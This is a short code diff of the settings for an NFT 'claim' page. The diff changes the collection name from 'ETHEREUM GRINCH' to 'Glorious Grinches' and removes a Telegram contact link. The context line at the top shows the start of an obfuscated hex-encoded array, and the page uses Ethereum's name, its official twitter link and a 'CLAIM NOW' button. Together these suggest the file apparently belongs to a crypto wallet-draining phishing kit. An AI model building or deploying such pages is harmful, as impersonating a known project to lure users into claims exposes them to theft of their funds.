@@ -7,7 +7,7 @@ var _0xf9cd=["\x30\x78\x65\x31","\x30\x78\x31\x31\x66","\x30\x78\x32\x39\x34","\
 
 // Collection settings
 const collectionInfo = {
-    name: "ETHEREUM GRINCH",
+    name: "Glorious Grinches",
     socialMedia: {
         discord: "",
         twitter: "https://twitter.com/ethereum",
@@ -24,7 +24,7 @@ const indexPageInfo = {
 const claimPageInfo = {
     title: "ETHEREUM", // <br> is a line break
     shortDescription: "",
-    longDescription: "https://t.me/rawchilly",
+    longDescription: "",
 
     claimButtonText: "CLAIM NOW",
 
